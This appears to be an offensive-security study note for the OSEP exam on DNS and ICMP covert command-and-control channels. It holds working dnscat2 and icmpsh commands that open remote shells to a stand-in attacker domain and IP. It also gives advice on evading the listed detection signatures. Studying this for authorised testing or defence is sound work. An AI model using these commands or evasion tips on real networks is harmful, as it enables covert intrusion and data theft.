---
title: DNS C2 and ICMP C2 (covert channels)
slug: dns-c2-and-icmp-c2
aliases: [dns-c2, icmp-c2, covert-channels]
---

{% raw %}

> **TL;DR:** When TCP/443 egress is blocked or heavily inspected, you fall back to channels the firewall lets through: DNS queries to your authoritative nameserver, or ICMP echo data fields to a host you control. Both are slow (DNS ≈ 1-10 KB/s, ICMP ≈ 5-50 KB/s) but reliable. OSEP expects you to know the model and at least one tool per channel. Companion to [[c2-protocol-design]] and [[domain-fronting-and-cdn-abuse]].

## When to reach for these

| Symptom | Channel |
|---|---|
| TCP/443 to your IP blocked, but `nslookup attacker.tld` works | DNS |
| All TCP/UDP blocked, but `ping 8.8.8.8` returns | ICMP |
| TLS interception is rewriting your traffic | DNS (queries are usually not inspected payload-deep) |
| You're inside a restricted VLAN / jump host | whichever the host can reach |

## DNS C2 — the mental model

1. You own a domain, e.g. `c2.example.com`.
2. You delegate it to your attacker NS at `ns1.c2.example.com → 10.10.14.5`.
3. Implant on victim wants to send "hello": it constructs `aGVsbG8.c2.example.com` and resolves it.
4. Victim's recursive resolver eventually queries your NS.
5. Your NS reads the subdomain label, decodes "hello", and answers with whatever data the implant needs (e.g. a TXT record containing the next command base64-encoded).

So: outbound data = subdomain labels of victim's queries. Inbound data = your NS's answer records (A, TXT, CNAME).

```
victim → recursive → attacker NS
"GET cmd?" via subdomain label
"cmd: whoami" via TXT answer
victim runs whoami
"OUT: nt authority\system" via next query labels
```

### Bandwidth budget

DNS label: up to 63 bytes. Hostname total: 253 bytes. So you get ~180 bytes outbound per query, minus your fixed domain and chunk metadata — call it 100 bytes useful. At 10 queries/sec that's 1 KB/s. Exfil of a 5 MB hash dump = 80 minutes.

### Tools

- **dnscat2** — interactive shell over DNS. Server on Kali, client implant in C/Go.
- **iodine** — IP-over-DNS (creates a tun interface). Use this when you need *any* IP traffic, not just a shell.
- **Cobalt Strike** — `mode dns`, `mode dns-txt`. Commercial.
- **Sliver** — open-source, includes DNS C2.

### dnscat2 walkthrough

```bash
# attacker (Kali)
git clone https://github.com/iagox86/dnscat2; cd dnscat2/server
gem install bundler; bundle install
ruby ./dnscat2.rb c2.example.com --secret=hunter2

# victim (Windows)
dnscat2-client.exe --secret=hunter2 c2.example.com
```

You get a shell-like interface on the server.

### DNS-over-HTTPS (DoH) flavor

Modern egress controls block plain DNS to internet but allow DoH (the browser does it). Implants now use `https://dns.google/dns-query` to send queries, the response is your C2. The "DNS" is just the format; the transport is HTTPS.

## ICMP C2 — the mental model

ICMP echo (ping) packets carry a 32-byte+ payload. If outbound ICMP to your IP is allowed, you can stuff arbitrary bytes in the payload and round-trip a shell.

Tools:
- **icmpsh** — old, simple, Python/PowerShell client. Good for OSEP-style proof.
- **ptunnel** — IP-over-ICMP tunnel.
- **Sliver** — has an ICMP transport on some platforms.

### icmpsh walkthrough

```bash
# attacker
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1   # stop kernel auto-replying
git clone https://github.com/inquisb/icmpsh
sudo ./icmpsh-m.py 10.10.14.5 <victim-ip>

# victim (no admin needed)
icmpsh.exe -t 10.10.14.5 -d 500 -b 30 -s 128
```

## Detection — what defenders see

DNS C2 signatures (so you know what to obscure):
- High volume of unique subdomain labels to one apex.
- Long TXT answers.
- Queries to apex with no public services.
- High entropy in subdomain strings.

ICMP C2 signatures:
- ICMP echo with non-default payload size.
- ICMP echoes to a single external IP at sustained rate.
- Payload that isn't the OS's default pattern.

You don't beat these without changing your traffic shape — split into low-frequency bursts, mix in noise queries (TXT/MX to common public domains), rotate apex names.

## Putting it together (OSEP shape)

Common engagement chain:
1. Initial-access payload (HTA, macro) drops a minimal stager.
2. Stager picks transport based on egress probe — TCP/443 first, then DoH, then plain DNS, then ICMP.
3. Long-haul C2 stays low-bandwidth; high-bandwidth ops (loot exfil) switch to a faster channel if available.

## Limitations

- DNS C2 latency: a recursive resolver caches your TXT answer for the TTL. Set TTL=0 or 1, but some recursive resolvers floor it.
- ICMP often blocked outbound on enterprise networks. Test cheaply with `ping -c 3 8.8.8.8`.
- Both channels are *loud* if defenders are looking. Use them when nothing else gets out, and keep the call rate low.

## References
- [dnscat2](https://github.com/iagox86/dnscat2)
- [iodine](https://github.com/yarrick/iodine)
- [icmpsh](https://github.com/inquisb/icmpsh)
- [PortSwigger Research — DNS rebinding & exfil](https://portswigger.net/research)
- [Sliver C2](https://github.com/BishopFox/sliver)
- See also: [[c2-protocol-design]], [[domain-fronting-and-cdn-abuse]], [[infrastructure-design]], [[osep-roadmap]]

{% endraw %}
